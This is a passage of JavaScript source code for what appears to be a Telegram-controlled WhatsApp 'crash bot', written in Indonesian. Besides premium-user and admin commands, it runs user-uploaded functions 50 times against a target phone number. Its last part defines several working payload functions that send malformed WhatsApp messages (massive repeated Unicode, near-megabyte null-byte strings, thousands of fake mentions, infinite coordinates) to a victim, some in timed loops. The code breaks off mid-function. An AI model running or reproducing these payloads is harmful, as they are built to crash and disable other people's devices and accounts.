    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi nomor target
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890');
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
    
    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, '❌ Nomor tidak valid. Pastikan 10-15 digit (termasuk kode negara).');
    }

    // Cek apakah user memiliki fungsi yang diupload dan belum dipakai
    const userFunc = userFunctions.get(userId);
    if (!userFunc || userFunc.used) {
        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan. Upload ulang dengan /uploadfunc');
    }

    // Cek koneksi WhatsApp
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.');
    }

    const target = `${formattedNumber}@s.whatsapp.net`;
    
    // Kirim status sedang diproses
    const sent = await bot.sendMessage(chatId, `🔄 Memproses fungsi ke target ${formattedNumber} (50x loop)...`);

    try {
        // Buat fungsi dari kode yang diupload
        const fn = new Function('sock', 'target', 'console', userFunc.code);

        // Loop 50 kali
        let successCount = 0;
        let errorCount = 0;
        
        for (let i = 0; i < 50; i++) {
            try {
                // Update status setiap 10 iterasi
                if (i % 10 === 0 && i > 0) {
                    await bot.editMessageText(
                        `🔄 Progress: ${i}/50 loop selesai... (Sukses: ${successCount}, Gagal: ${errorCount})`,
                        { chat_id: chatId, message_id: sent.message_id }
                    );
                }
                
                // Jalankan fungsi
                await fn(sock, target, console);
                successCount++;
                
                // Delay kecil agar tidak overload
                await sleep(500); // 500ms delay antar eksekusi
                
            } catch (err) {
                errorCount++;
                console.error(`Error pada loop ke-${i + 1}:`, err.message);
            }
        }

        // Hapus data fungsi setelah digunakan (one-time use)
        userFunctions.delete(userId);

        // Kirim hasil akhir
        await bot.editMessageText(
            `✅ Fungsi selesai dijalankan!\n\n` +
            `📊 Hasil:\n` +
            `• Total loop: 50\n` +
            `• Sukses: ${successCount}\n` +
            `• Gagal: ${errorCount}\n` +
            `• Target: ${formattedNumber}`,
            { 
                chat_id: chatId, 
                message_id: sent.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Buka WhatsApp", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

    } catch (err) {
        await bot.editMessageText(
            `❌ Gagal menjalankan fungsi: ${err.message}`,
            { chat_id: chatId, message_id: sent.message_id }
        );
        // Jika error, tetap tandai sebagai used agar tidak bisa dipakai lagi
        userFunctions.delete(userId);
    }
});

// Versi dengan parameter tambahan jika fungsi butuh akses ke bot atau chatId
// Command: /testfunction2 [nomor]
bot.onText(/\/testfunction2(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction2 [nomor]');
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, '❌ Nomor tidak valid.');
    }

    const userFunc = userFunctions.get(userId);
    if (!userFunc || userFunc.used) {
        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan.');
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung.');
    }

    const target = `${formattedNumber}@s.whatsapp.net`;
    
    const sent = await bot.sendMessage(chatId, `🔄 Memproses dengan parameter lengkap...`);

    try {
        // Buat fungsi dengan parameter lebih lengkap
        const fn = new Function('sock', 'target', 'bot', 'chatId', 'msg', 'console', userFunc.code);

        // Loop 50 kali
        for (let i = 0; i < 50; i++) {
            await fn(sock, target, bot, chatId, msg, console);
            await sleep(300); // Delay 300ms
            
            // Update progress setiap 10 loop
            if ((i + 1) % 10 === 0) {
                await bot.editMessageText(
                    `🔄 Progress: ${i + 1}/50 loop selesai...`,
                    { chat_id: chatId, message_id: sent.message_id }
                );
            }
        }

        userFunctions.delete(userId);

        await bot.editMessageText(
            `✅ 50x loop selesai untuk target ${formattedNumber}`,
            { 
                chat_id: chatId, 
                message_id: sent.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Buka WhatsApp", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

    } catch (err) {
        await bot.editMessageText(
            `❌ Error: ${err.message}`,
            { chat_id: chatId, message_id: sent.message_id }
        );
        userFunctions.delete(userId);
    }
});
///////// ( CONTROL ) \\\\\\\\\\\\\\\
bot.onText(/^\/reloadcore$/, async (msg) => {
    pullUpdate(bot, msg);
});
bot.onText(/^\/connect\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const botNumber = match[1].replace(/[^0-9]/g, "");

    if (!ceoUsers.includes(userId) && !isOwner(userId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/ceo* yang dapat menjalankan perintah ini.
`, { parse_mode: "Markdown" });
    }

    if (!botNumber || botNumber.length < 8) {
        return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/connect 628xxxxxx\`
`, { parse_mode: "Markdown" });
    }

    try {
        await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

        await connectToWhatsApp(botNumber, chatId);

        

    } catch (error) {
        console.error("❌ Error in /connect:", error);
        bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
    }
});
bot.onText(/^\/resetsession$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Hanya owner atau ceo
    if (!isOwner(userId) && !ceoUsers.includes(userId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/ceo* yang dapat mereset sesi.
`, { parse_mode: "Markdown" });
    }

    try {
        // Hapus semua sesi dari memori
        sessions.clear();
        sock = null;

        // Hapus folder sessions
        if (fs.existsSync(SESSIONS_DIR)) {
            fs.rmSync(SESSIONS_DIR, { recursive: true, force: true });
        }

        // Hapus file active_sessions.json
        if (fs.existsSync(SESSIONS_FILE)) {
            fs.unlinkSync(SESSIONS_FILE);
        }

        await bot.sendMessage(chatId, `
✅ *Semua sesi WhatsApp berhasil dihapus!*
Bot akan mencoba menyambung ulang secara otomatis.
`, { parse_mode: "Markdown" });

        // Inisialisasi ulang koneksi WhatsApp
        initializeWhatsAppConnections();

    } catch (err) {
        console.error("Gagal reset session:", err);
        bot.sendMessage(chatId, `
❌ Gagal mereset sesi.
> ${err.message}
`, { parse_mode: "Markdown" });
    }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <pre>6843967527 30d</pre>
`, { parse_mode: "HTML" });
    }

    const args = match[1].split(' ');
    if (args.length < 2) {
        return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <pre>6843967527 30d</pre>
`, { parse_mode: "HTML" });
    }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1].toLowerCase();

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
    }

    if (!/^\d+[dhm]$/.test(duration)) {
        return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
    }

    const timeValue = parseInt(duration);
    const timeUnit = duration.endsWith("d") ? "days" :
                     duration.endsWith("h") ? "hours" : "minutes";
    const expirationDate = moment().add(timeValue, timeUnit);

    const existingUser = premiumUsers.find(u => u.id === userId);
    if (existingUser) {
        existingUser.expiresAt = expirationDate.toISOString();
        savePremiumUsers();
        bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
    } else {
        premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
        savePremiumUsers();
        bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
    }

    console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});


/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
    }

    if (premiumUsers.length === 0) {
        return bot.sendMessage(chatId, "📌 No premium users found.");
    }

    let message = "```";
    message += "\n";
    message += " ( + )  LIST PREMIUM USERS\n";
    message += "\n";
    premiumUsers.forEach((user, index) => {
        const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
        message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
    });
    message += "\n```";

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
///// Case Ai
// index.js




// --- ( case add ceo ) ---
bot.onText(/\/addceo(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addceo 58273654 30d
`);
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addceo 58273654 30d
`);
    }

    if (!ceoUsers.includes(userId)) {
        ceoUsers.push(userId);
        saveceoUsers();
        console.log(`${senderId} Added ${userId} To ceo`);
        bot.sendMessage(chatId, `
✅ Berhasil menambahkan ceo!
Kini user ${userId} memiliki akses ceo.
`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi ceo.`);
    }
});

// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/ceo yang dapat melakukan command ini.`);
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
    }

    const userId = parseInt(match[1]);
    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});

// --- ( case delete acces ceo ) ---
bot.onText(/\/delceo(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delceo 5843967527`);
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delceo 5843967527`);
    }

    const ceoIndex = ceoUsers.indexOf(userId);
    if (ceoIndex !== -1) {
        ceoUsers.splice(ceoIndex, 1);
        saveceoUsers();
        console.log(`${senderId} Removed ${userId} From ceo`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar ceo.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses ceo.`);
    }
});

// Command /addgroup - Hanya bisa digunakan di dalam grup
bot.onText(/^\/addgroup$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    // Cek apakah command dijalankan di grup
    if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
        return bot.sendMessage(chatId, `
❌ *Perintah ini hanya bisa digunakan di dalam grup!*
Silakan tambahkan bot ke grup dan jalankan perintah di sana.
`, { parse_mode: "Markdown" });
    }

    // Cek akses (hanya owner dan ceo)
    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.
Hanya *Owner/CEO* yang dapat menambahkan grup premium.
`, { parse_mode: "Markdown" });
    }

    // Cek apakah grup sudah premium
    if (premiumGroups.includes(chatId)) {
        return bot.sendMessage(chatId, `
✅ *Grup ini sudah terdaftar sebagai grup premium!*
Tidak perlu menambahkan lagi.
`, { parse_mode: "Markdown" });
    }

    try {
        // Dapatkan info grup
        const chat = await bot.getChat(chatId);
        const groupName = chat.title || "Unknown Group";
        const groupLink = chat.inviteLink || "Tidak ada link";
        const memberCount = await bot.getChatMembersCount(chatId);

        // Tambahkan grup ke database premium
        premiumGroups.push(chatId);
        savePremiumGroups();

        // Kirim notifikasi sukses ke grup
        await bot.sendMessage(chatId, `
✅ *BERHASIL MENAMBAHKAN GRUP PREMIUM!*

📊 *Informasi Grup:*
• Nama Grup : ${groupName}
• ID Grup : \`${chatId}\`
• Total Member : ${memberCount} orang
• Status : ✅ PREMIUM (Permanen)
• Ditambahkan oleh : ${msg.from.first_name || 'Admin'} (@${msg.from.username || 'no username'})

🎉 *Fitur premium sekarang aktif untuk grup ini!*
Terima kasih telah mendukung kami.
`, { parse_mode: "Markdown" });

        // Kirim notifikasi ke owner (opsional)
        const ownerId = config.OWNER_ID[0]; // Ambil owner pertama
        if (ownerId) {
            await bot.sendMessage(ownerId, `
🔔 *NOTIFIKASI GRUP PREMIUM BARU*

• Nama Grup : ${groupName}
• ID Grup : \`${chatId}\`
• Total Member : ${memberCount}
• Ditambahkan oleh : ${msg.from.first_name} (ID: ${senderId})
• Link Grup : ${groupLink}

⏰ Waktu: ${moment().format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
        }

        console.log(chalk.green(`[GROUPPREM] ${senderId} menambahkan grup ${chatId} (${groupName})`));

    } catch (error) {
        console.error("Error adding premium group:", error);
        bot.sendMessage(chatId, `
❌ *Gagal menambahkan grup premium!*
Error: ${error.message}

Silakan coba lagi atau hubungi owner.
`, { parse_mode: "Markdown" });
    }
});

// --- ( case list grup premium ) ---
bot.onText(/\/listgroup/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek akses (hanya owner dan ceo)
    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/CEO* yang dapat melihat daftar grup premium.
`, { parse_mode: "Markdown" });
    }

    if (premiumGroups.length === 0) {
        return bot.sendMessage(chatId, "📌 Belum ada grup premium yang terdaftar.");
    }

    let message = "```\n";
    message += "📋 DAFTAR GRUP PREMIUM\n";
    message += "══════════════════════\n\n";

    // Tampilkan 10 grup pertama (batasi untuk menghindari pesan terlalu panjang)
    const displayGroups = premiumGroups.slice(0, 10);
    
    for (let i = 0; i < displayGroups.length; i++) {
        const groupId = displayGroups[i];
        try {
            // Coba dapatkan info grup
            const chat = await bot.getChat(groupId);
            const groupName = chat.title || "Unknown";
            message += `${i + 1}. ${groupName}\n`;
            message += `   ID: ${groupId}\n`;
            message += `   Member: ${await bot.getChatMembersCount(groupId)} orang\n\n`;
        } catch (error) {
            // Jika gagal dapat info, tampilkan ID saja
            message += `${i + 1}. Grup tidak dapat diakses\n`;
            message += `   ID: ${groupId}\n\n`;
        }
    }

    if (premiumGroups.length > 10) {
        message += `...dan ${premiumGroups.length - 10} grup lainnya\n`;
    }

    message += `\nTotal: ${premiumGroups.length} grup premium\n`;
    message += "```";

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case hapus grup premium ) ---
bot.onText(/\/delgroup(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek akses (hanya owner dan ceo)
    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/CEO* yang dapat menghapus grup premium.
`, { parse_mode: "Markdown" });
    }

    let targetGroupId;

    // Jika dijalankan di dalam grup dan tanpa parameter
    if ((msg.chat.type === 'group' || msg.chat.type === 'supergroup') && (!match || !match[1])) {
        targetGroupId = chatId;
    } 
    // Jika ada parameter ID grup
    else if (match && match[1]) {
        targetGroupId = match[1].trim();
    } 
    // Jika tidak valid
    else {
        return bot.sendMessage(chatId, `
❌ *Perintah Salah!*
Gunakan format:
✅ /delgroup (untuk hapus grup saat ini)
✅ /delgroup -1001234567890 (untuk hapus grup dengan ID tertentu)

*Catatan:* Perintah ini hanya bisa digunakan owner/CEO.
`, { parse_mode: "Markdown" });
    }

    // Validasi format ID grup
    if (!targetGroupId.startsWith('-100')) {
        return bot.sendMessage(chatId, `
❌ *ID Grup Tidak Valid!*
ID grup harus diawali dengan -100.
Contoh: -1001234567890
`, { parse_mode: "Markdown" });
    }

    // Cek apakah grup ada di database
    const index = premiumGroups.indexOf(targetGroupId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ Grup dengan ID \`${targetGroupId}\` tidak ditemukan di daftar premium.`, { parse_mode: "Markdown" });
    }

    try {
        // Hapus dari database
        premiumGroups.splice(index, 1);
        savePremiumGroups();

        let responseMessage = `
✅ *Berhasil menghapus grup premium!*
ID Grup: \`${targetGroupId}\`
`;

        // Jika grup masih bisa diakses, coba dapatkan nama
        try {
            const chat = await bot.getChat(targetGroupId);
            responseMessage = `
✅ *Berhasil menghapus grup premium!*
Nama Grup: ${chat.title}
ID Grup: \`${targetGroupId}\`
`;
        } catch (e) {
            // Abaikan jika tidak bisa akses
        }

        bot.sendMessage(chatId, responseMessage, { parse_mode: "Markdown" });
        console.log(chalk.yellow(`[GROUPPREM] ${senderId} menghapus grup ${targetGroupId}`));

    } catch (error) {
        console.error("Error deleting premium group:", error);
        bot.sendMessage(chatId, `❌ Gagal menghapus grup: ${error.message}`);
    }
});

// Case about me
bot.onText(/\/aboutme/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username ? `@${msg.from.username}` : "No username";
        const fullName = `${msg.from.first_name || ""} ${msg.from.last_name || ""}`.trim() || "Anonymous";

        const isUserPremium = premiumUsers.some(user => 
            user.id === userId && new Date(user.expiresAt) > new Date()
        );
        const premiumStatus = isUserPremium ? "✅ Premium" : "❌ Regular";

        const aboutMessage = `
<pre>
┌─────────────────────────┐
│        ABOUT USER        │
├─────────────────────────┤
│ USERNAME : ${username.padEnd(15)} │
│ USER ID  : ${userId.toString().padEnd(15)} │
│ STATUS   : ${premiumStatus.padEnd(15)} │
│ NAME     : ${fullName.padEnd(15)} │
└─────────────────────────┘
</pre>`;

        await bot.sendMessage(msg.chat.id, aboutMessage, {
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id
        });

    } catch (error) {
        console.error("Error /aboutme:", error);
        bot.sendMessage(msg.chat.id, "❌ Error showing info");
    }
});
////FUNC 
async function BulldozerZeroMsg(sock, target) {
  const zepUnicode = "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000);
  
  const productImage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("T+i083KjdABcBnJBzbB8paMZoMyNxT3rc+8FUOb4Qtg=", "base64"),
    fileLength: "38617",
    height: 128000000,
    width: 7200000000,
    mediaKey: Buffer.from("zi+b43DCleFrEbpS7EOYN1eKcRykOKDmUmDj3ISXvZI=", "base64"),
    fileEncSha256: Buffer.from("54hPlvNm6Nk1roPnpQGvfvCu8JYb4wLalZ0FZay7Src=", "base64"),
    directPath: "/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1765450399",
    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD", "base64")
  };

  const product = {
    productImage: productImage,
    productId: "253813391248495300",
    title: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + zepUnicode,
    currencyCode: "USD",
    priceAmount1000: "0",
    productImageCount: 1000000
  };

  const deviceListMetadata = {
    recipientKeyHash: "iGDumWoqJtlqxw==",
    recipientTimestamp: "1765411475"
  };

  const messageContextInfo = {
    deviceListMetadata: deviceListMetadata,
    deviceListMetadataVersion: 2,
    messageSecret: "WP/LUg2LGEOMfWhJuSzNtPrDi+L1RjGRiYo+45drhMc="
  };

  const zieeMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      productMessage: {
        product: product,
        businessOwnerJid: "225752674992330@lid"
      },
      messageContextInfo: messageContextInfo
    },
    {}
  );

  await sock.relayMessage("status@broadcast", zieeMsg.message, {
    messageId: zieeMsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { 
                tag: "to", 
                attrs: { jid: target }, 
                content: undefined 
              }
            ]
          }
        ]
      }
    ]
  });
}
async function coreDrain(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "zHOLA"
          },
          nativeFlowMessage: {
            messageParamsJson: "[{".repeat(10000),
            buttons: [{
              name: "galaxy_message",
              buttonParamsJson: "\u0000".repeat(950000)
            }]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net" ),
            remoteJid: target
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id, participant: { jid: target }
  });
}
async function DelayXburn(sock, target) {
  let payload = "ꦾ࣯࣯".repeat(25000);
  const mentions = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    )
  ];
  
  let message = {
    locationMessage: {
      degreesLatitude: -1e309,
      degreesLongitude: 1e309,
      name: "JEMBUT" + payload,
      address: payload,
      accuracyInMeters: 1e309,
      contextInfo: {
        stanzaId: "zāyy off" + Date.now(),
        forwardingScore: 666,
        isForwarded: true,
        remoteJid: "status@brosdcast",
        mentionedJid: mentions
      }
    }
  };
  
  let messege = {
    interactiveMessage: {
      body: {
        text: payload + payload
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
        buttons: [{
          name: "galaxy_message",
          buttonParamsJson: "\u0000".repeat(950000)
        }]
      },
      contextInfo: {
        mentionedJid: mentions
      }
    }
  };
  
  const msg = generateWAMessageFromContent(target, message, {});
  const msgs = generateWAMessageFromContent(target, messege, {});
  for (var i = 0; i < 1; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, { participant: { jid: target }, messageId: msg.key.id });
  }
  
  await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msgs.message
      }
    }, { participant: { jid: target}, messageId: msgs.key.id });
}
async function VsxMeta(sock, target) {
  const IlegRXVZ = Date.now();
  const Ilegal = 5 * 60 * 1000; 
  const RXVZNew = 5 * 1000; 
  try {
    while (Date.now() - IlegRXVZ < Ilegal) {
      const timeElapsed = Date.now() - IlegRXVZ;
      const timeLeft = Ilegal - timeElapsed;
      const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: -66.666,
              degreesLongtitude: 66.666,
              name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
              address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
              jpegThumbnail: null,
              url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
              contextInfo: {
                participant: target,
                forwardingScore: 1,
                isForwarded: true,
                stanzaId: target,
                mentionedJid: [target]
              },
            },
          },
        },
      }, {});
      if (timeLeft > RXVZNew) {
        await sock.relayMessage(target, {
          requestPhoneNumberMessage: {
            contextInfo: {
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/pdf",
                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
                  fileLength: 0,
                  pageCount: 0,
                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
                  fileName: "HeryRXVZ.pdf",
                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
                  mediaKeyTimestamp: 1737369406,
                  caption: "PUQI",
                  title: "PUQI",
                  mentionedJid: [target],
                }
              },
              externalAdReply: {
                title: "PUCITA",
                body: "𑇂𑆵𑆴𑆿".repeat(30000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/durov",
                mediaUrl: "https://t.me/durov",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example"
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
                contentType: "UPDATE",
              },
            },
            skipType: 7,
          }
        }, { participant: { jid: target } });
      }
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta", attrs: {}, content: [{
            tag: "mentioned_users", attrs: {}, content: [{
              tag: "to", attrs: { jid: target }, content: undefined
            }],
          }],
        }],
      });
      if (timeLeft <= RXVZNew) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  } catch (error) {
    console.log(error);
  }
}
async function AxDEnres(sock, target) {

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "\0"
            },
            footer: {
              text: "\0"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "DOCUMENT",
                    flow_cta: "ꦽ".repeat(25000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: JSON.stringify({
                    transaction_id: "AXD-" + Date.now() + "ꦽ".repeat(40000)
                  })
                },
                {
                  name: "send_location",
                  buttonParamsJson: JSON.stringify({
                    location_name: "ꦽ".repeat(25000),
                    latitude: 1e308,
                    longitude: 1e308
                  })
                },

                {
                  name: "payment_request",
                  buttonParamsJson: JSON.stringify({
                    currency: "USD",
                    amount: "999999999",
                    note: "ꦽ".repeat(25000)
                  })
                },

                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Open",
